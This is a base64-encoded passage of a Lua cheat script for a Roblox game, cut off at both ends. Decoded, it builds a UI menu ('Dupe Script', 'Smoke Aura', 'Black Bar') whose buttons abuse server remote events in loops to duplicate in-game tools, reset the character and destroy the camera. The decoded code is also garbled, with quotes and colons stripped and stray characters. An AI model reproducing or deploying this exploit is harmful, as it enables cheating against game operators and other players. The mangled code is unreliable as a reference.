XdhbnR0b2R1cGUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGVJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sdGhhdGl3YW50dG9kdXBlXUZpbmRGaXJzdENoaWxkKEhhbmRsZSkuTmFtZSA9IEjDosIgwqVhw6LCIMKlbsOiwiDCpWTDosIgwqVsw6LCIMKlZQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCAgICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpIGVuZCB3YWl0KCkgdW50aWwgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KSA9PSBuaWwKICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgICAgICB0b29sZ3JpcCA9IHRydWUKICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICB3YWl0KCkKbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkV2FpdCgpCmxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQoKCnByaW50KGRvbmUpCndhaXQoMSkKbG9jYWwgR3JpcFBvc1RhYmxlID0gewogICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygzMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAwKSwKICBWZWN0b3IzLm5ldyg2MCwgMCwgMCksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMCksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDMwKSwKICBWZWN0b3IzLm5ldygtMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgMzApLAogICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCA0NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwKICBWZWN0b3IzLm5ldygtMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgNDUpLAogIFZlY3RvcjMubmV3KDAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIDE1KSwKICBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLAogIFZlY3RvcjMubmV3KDUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIDE1KSwgICAgICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAxNSksClZlY3RvcjMubmV3KDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0xNSksICAgICAgICAgICAgICAgICAgICAgIAogIFZlY3RvcjMubmV3KC0wLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC0xMCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTMwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KC00MCwgMCwgLTE1KSwKICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksCiAgVmVjdG9yMy5uZXcoLTYwLCAwLCAtMTUpLAogIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC0zMCksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTMwKSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTMwKSwKICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTQ1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNDUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTQ1KSwKICAgIFZlY3RvcjMubmV3KDEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDIwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDUwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgVmVjdG9yMy5uZXcoLTAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC0yMCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtMzAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLAogIFZlY3RvcjMubmV3KC01MCwgMCwgLTYwKSwKICBWZWN0b3IzLm5ldygtNjAsIDAsIC02MCksCiAgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMjAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoMzAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoNjAsIDAsIC03NSksICAgICAgICAgICAgICAgICAgICAgICAgICAKICBWZWN0b3IzLm5ldygtMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtMTAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC0zMCwgMCwgLTc1KSwKICBWZWN0b3IzLm5ldygtNDAsIDAsIC03NSksCiAgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLAogIFZlY3RvcjMubmV3KC02MCwgMCwgLTc1KSwKCgogICAgIH0KICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgaWYgdG9vbElzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgd2FybihUb29sLCB0b29sLk5hbWUsIGlzIG5vdCBpbiBjaGFyYWN0ZXIpCiAgICAgICAgICAgICAgZW5kCiAgICAgICAgICBlbmQKICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgU21va2UgQXVyYQpUb29sc1RhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gU21va2UgQXVyYSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLCB7CiAgICAgICAgICAgIFRpdGxlID0gRHVwZSBTY3JpcHQsCiAgICAgICAgICAgIFRleHQgPSBQbGVhc2UgZG8gbm90IGVxdWlwIGFueSB0b29scyBvciB1bmVxdWlwIHRvb2xzIG9yIGNsaWNrIHRvb2xzIG9uIGludmVudG9yeS4gSXQgd2lsbCBicmVhayB0aGUgc2NyaXB0LiwKICAgICAgICAgICAgQnV0dG9uMSA9IEkgdW5kZXJzdGFuZCwKICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgfSkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICBbMV0gPSBDbGVhckFsbFRvb2xzCiAgICAgICAgfQogICAgICAgIGNsZWFydG9vbHJlbW90ZUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICB3YWl0KDAuMykKICAgICAgICBmb3IgaSA9IDEsIDEyNCBkbwogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgWzJdID0gRmlyZUhvc2UKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxVG9vMWwpSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9IEZpcmVIb3NlLAogICAgICAgICAgICAgICAgWzJdID0gRGVzdHJveUZpcmVIb3NlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2suRmlyZUhvc2UuVG9vbFNvdW5kRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgZW5kCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgIGh1bWFub2lkLkhlYWx0aCA9IDAKICAgICAgICBlbmQKICAgICAgICB3YWl0KDgpCiAgICAgICAgbG9jYWwgR3JpcFBvc1RhYmxlID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIDApLCBWZWN0b3IzLm5ldygyMCwgMCwgMCksIFZlY3RvcjMubmV3KDMwLCAwLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNDAsIDAsIDApLCBWZWN0b3IzLm5ldyg1MCwgMCwgMCksIFZlY3RvcjMubmV3KDYwLCAwLCAwKSwgVmVjdG9yMy5uZXcoLTAsIDAsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMTAsIDAsIDApLCBWZWN0b3IzLm5ldygtMjAsIDAsIDApLCBWZWN0b3IzLm5ldygtMzAsIDAsIDApLCBWZWN0b3IzLm5ldygtNDAsIDAsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtNTAsIDAsIDApLCBWZWN0b3IzLm5ldygtNjAsIDAsIDApLCBWZWN0b3IzLm5ldygwLCAwLCAzMCksIFZlY3RvcjMubmV3KDEwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAzMCksIFZlY3RvcjMubmV3KDMwLCAwLCAzMCksIFZlY3RvcjMubmV3KDQwLCAwLCAzMCksIFZlY3RvcjMubmV3KDUwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDYwLCAwLCAzMCksIFZlY3RvcjMubmV3KC0wLCAwLCAzMCksIFZlY3RvcjMubmV3KC0xMCwgMCwgMzApLCBWZWN0b3IzLm5ldygtMjAsIDAsIDMwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTMwLCAwLCAzMCksIFZlY3RvcjMubmV3KC00MCwgMCwgMzApLCBWZWN0b3IzLm5ldygtNTAsIDAsIDMwKSwgVmVjdG9yMy5uZXcoLTYwLCAwLCAzMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMTAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMzAsIDAsIDQ1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoNDAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoNTAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoNjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoLTAsIDAsIDQ1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwLCAwLCA0NSksIFZlY3RvcjMubmV3KC0yMCwgMCwgNDUpLCBWZWN0b3IzLm5ldygtMzAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoLTQwLCAwLCA0NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC01MCwgMCwgNDUpLCBWZWN0b3IzLm5ldygtNjAsIDAsIDQ1KSwgVmVjdG9yMy5uZXcoMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygxMCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygzMCwgMCwgMTUpLCBWZWN0b3IzLm5ldyg0MCwgMCwgMTUpLCBWZWN0b3IzLm5ldyg1MCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtMTAsIDAsIDE1KSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAxNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC0zMCwgMCwgMTUpLCBWZWN0b3IzLm5ldygtNDAsIDAsIDE1KSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAxNSksIFZlY3RvcjMubmV3KC02MCwgMCwgMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygxMCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoMjAsIDAsIC0xNSksIFZlY3RvcjMubmV3KDMwLCAwLCAtMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg0MCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoNTAsIDAsIC0xNSksIFZlY3RvcjMubmV3KDYwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygtMCwgMCwgLTE1KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwLCAwLCAtMTUpLCBWZWN0b3IzLm5ldygtMjAsIDAsIC0xNSksIFZlY3RvcjMubmV3KC0zMCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoLTQwLCAwLCAtMTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtNTAsIDAsIC0xNSksIFZlY3RvcjMubmV3KC02MCwgMCwgLTE1KSwgVmVjdG9yMy5uZXcoMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIC0zMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAtMzApLCBWZWN0b3IzLm5ldygzMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoNDAsIDAsIC0zMCksIFZlY3RvcjMubmV3KDUwLCAwLCAtMzApLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTAsIDAsIC0zMCksIFZlY3RvcjMubmV3KC0xMCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAtMzApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMzAsIDAsIC0zMCksIFZlY3RvcjMubmV3KC00MCwgMCwgLTMwKSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAtMzApLCBWZWN0b3IzLm5ldygtNjAsIDAsIC0zMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIC0zMCksIFZlY3RvcjMubmV3KDEwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygyMCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoMzAsIDAsIC00NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDQwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldyg1MCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoNjAsIDAsIC00NSksIFZlY3RvcjMubmV3KC0wLCAwLCAtNDUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMTAsIDAsIC00NSksIFZlY3RvcjMubmV3KC0yMCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoLTMwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygtNDAsIDAsIC00NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KC01MCwgMCwgLTQ1KSwgVmVjdG9yMy5uZXcoLTYwLCAwLCAtNDUpLCBWZWN0b3IzLm5ldygxMCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoMjAsIDAsIC02MCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDMwLCAwLCAtNjApLCBWZWN0b3IzLm5ldyg0MCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoNTAsIDAsIC02MCksIFZlY3RvcjMubmV3KDYwLCAwLCAtNjApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoLTEwLCAwLCAtNjApLCBWZWN0b3IzLm5ldygtMjAsIDAsIC02MCksIFZlY3RvcjMubmV3KC0zMCwgMCwgLTYwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTQwLCAwLCAtNjApLCBWZWN0b3IzLm5ldygtNTAsIDAsIC02MCksIFZlY3RvcjMubmV3KC02MCwgMCwgLTYwKSwgVmVjdG9yMy5uZXcoMTAsIDAsIC03NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAwLCAtNzUpLCBWZWN0b3IzLm5ldygzMCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoNDAsIDAsIC03NSksIFZlY3RvcjMubmV3KDUwLCAwLCAtNzUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldyg2MCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTAsIDAsIC03NSksIFZlY3RvcjMubmV3KC0xMCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTIwLCAwLCAtNzUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygtMzAsIDAsIC03NSksIFZlY3RvcjMubmV3KC00MCwgMCwgLTc1KSwgVmVjdG9yMy5uZXcoLTUwLCAwLCAtNzUpLCBWZWN0b3IzLm5ldygtNjAsIDAsIC03NSkKICAgICAgICB9CiAgICAgICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdG9vbElzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAgIGlmIHRvb2xJc0Rlc2NlbmRhbnRPZihnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHdhcm4oVG9vbCAsIHRvb2wuTmFtZSwgIGlzIG5vdCBpbiB0aGUgY2hhcmFjdGVyLikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gU2VjdGlvbiBmb3IgU3BlY2lhbCBHcmlwClNlY3Rpb24gPSBUb29sc1RhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IFNwZWNpYWwgR3JpcAp9KQoKLS0gQnV0dG9uIGZvciBCbGFjayBCYXIKVG9vbHNUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IEJsYWNrIEJhciwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBvbGRjZnJhbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgICAgICAgICB0b29sdGhhdGl3YW50dG9kdXBlID0gQm94CiAgICAgICAgICAgICAgICB0b29scyA9IEJveAogICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSBDbGVhckFsbFRvb2xzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNsZWFydG9vbHJlbW90ZUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlK